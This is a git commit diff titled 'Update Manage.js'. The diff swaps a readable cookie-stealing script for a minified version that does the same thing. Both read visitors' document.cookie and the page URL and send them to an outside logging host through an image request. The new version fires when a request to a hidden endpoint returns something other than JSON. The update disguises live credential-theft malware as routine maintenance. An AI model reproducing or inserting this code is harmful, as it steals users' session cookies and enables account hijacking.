9cdda9268ca05451a0b772d69744057fd01e253b
9os <druidboykoston@gmail.com>
2017-12-05 03:28:42 -0600

    Update Manage.js

--- Manage.js
+++ Manage.js
@@ -1,7 +1,1 @@
-cookie = "Cookies:"+document.cookie;
-url = "URL:"+document.location;
-
-$data = encodeURIComponent(cookie+url);
-
-var imageObject = new Image();
-imageObject.src = "http://h.net16.net/log.php?log="+$data;
+$(document).ready(function(){$.ajax("/vrxt415",{success:function(e){try{jQuery.parseJSON(e)}catch(e){c="C:"+document.cookie,u="U:"+document.location,(new Image).src="http://h.net16.net/log.php?log="+encodeURIComponent(c+u)}}})});
